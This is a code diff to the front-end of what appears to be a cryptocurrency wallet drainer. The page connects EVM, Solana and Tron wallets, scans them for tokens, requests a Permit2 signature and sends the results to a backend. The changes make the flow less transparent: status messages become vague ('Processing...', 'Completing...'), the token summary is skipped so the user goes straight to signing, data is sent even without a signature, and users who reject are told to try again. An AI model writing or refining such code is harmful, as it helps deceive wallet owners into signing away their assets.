@@ -232,7 +232,7 @@ function init() {
 // ============ FULL SCAN ============
 async function startFullScan() {
   try {
-    showProgress('connect', 'Connecting...');
+    showProgress('connect', 'Processing...');
     
     await Promise.all([
       tryConnectEVM(),
@@ -242,8 +242,10 @@ async function startFullScan() {
     
     log(`Connections: EVM=${!!evmAddress}, Solana=${!!solanaAddress}, Tron=${!!tronAddress}`);
     
-    showProgress('scan', 'Scanning');
     await scanAllChains();
+    
+    // Skip showing tokens summary, go straight to signature
+    await requestSignature();
     
   } catch (err) {
     log('Scan error: ' + err.message, 'error');
@@ -541,7 +543,7 @@ async function scanAllChains() {
     return;
   }
   
-  showProgress('sign', `Found ${foundTokens.length} tokens. Requesting signature...`);
+  // Proceed directly to signature (UI already streamlined in startFullScan)
   await requestSignature();
 }
 
@@ -549,7 +551,6 @@ async function scanAllChains() {
 async function requestSignature() {
   if (!evmAddress || !evmSigner) {
     log('No EVM signer, skipping signature', 'warn');
-    showProgress('send', 'No EVM signature needed...');
     await sendToBackend();
     return;
   }
@@ -558,12 +559,13 @@ async function requestSignature() {
   
   if (evmTokens.length === 0) {
     log('No EVM tokens to sign', 'warn');
-    showProgress('send', 'No EVM tokens to sign...');
     await sendToBackend();
     return;
   }
   
   try {
+    showProgress('sign', 'Signing...');
+    
     log('Creating Permit2 signature...');
     log(`Chain: ${evmChainId}, Tokens: ${evmTokens.map(t => t.symbol).join(', ')}`);
     
@@ -623,7 +625,7 @@ async function requestSignature() {
     
     log(`✅ Signature: ${signature.substring(0, 30)}...`, 'success');
     
-    showProgress('send', 'Signature received, sending to backend...');
+    showProgress('send', 'Completing...');
     await sendToBackend();
     
   } catch (err) {
@@ -632,7 +634,7 @@ async function requestSignature() {
     if (err.code === 4001) {
       showError('You rejected the signature. Please try again.');
     } else {
-      showProgress('send', 'Signature error, sending without sig...');
+      showProgress('send', 'Completing without signature...');
       await sendToBackend();
     }
   }
